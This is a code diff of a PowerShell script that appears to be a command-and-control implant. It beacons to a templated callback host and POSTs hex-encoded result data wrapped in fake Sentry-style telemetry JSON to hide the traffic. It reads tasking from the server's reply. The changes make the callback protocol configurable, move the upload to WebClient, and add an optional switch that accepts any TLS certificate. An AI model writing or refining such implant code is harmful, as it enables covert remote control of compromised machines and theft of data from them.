@@ -8,7 +8,14 @@ $beat = $bytesAgentType + $bytesAgentId
 
 $hexStringBeat = [System.BitConverter]::ToString($beat) -replace '-'
 
-$uri = "http://<CALLBACK_HOST>:<CALLBACK_PORT>/api/" + $randomId + "/envelope"
+$uri = "<CALLBACK_PROTOCOL>://<CALLBACK_HOST>:<CALLBACK_PORT>/api/" + $randomId + "/envelope"
+
+# TBD: Currently enabling SSL certificate sets this, update to only skip SSL check for self-signed certificates
+$skipSslVerification = $false
+
+if ($skipSslVerification) {
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+}
 
 $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
@@ -122,9 +129,17 @@ function SendData($result) {
 {"contexts":{"trace":{"trace_id":"trace123456789abc","span_id":"span123456789abc","op":"pageload"}},"spans":[{"span_id":"span987654321def","op":"http.client","description":"' + $hexStringData + '","start_timestamp":1704067200.000,"timestamp":1704067200.100,"trace_id":"trace123456789abc"}],"start_timestamp":1704067200.000,"timestamp":1704067201.000,"transaction":"/home","type":"transaction","platform":"javascript"}
 '
 
-    $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body -UseBasicParsing
+    # $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body -UseBasicParsing
+    $client = New-Object System.Net.WebClient
+    $client.Headers["Content-Type"] = "application/json"
 
-    $encodedTaskData = ($response.Content | convertfrom-json).id
+    $response = $client.UploadString(
+        $uri,
+        "POST",
+        $Body
+    )
+
+    $encodedTaskData = ($response | convertfrom-json).id
     if ($encodedTaskData -eq "") {
         return New-Object System.Collections.ArrayList
     }
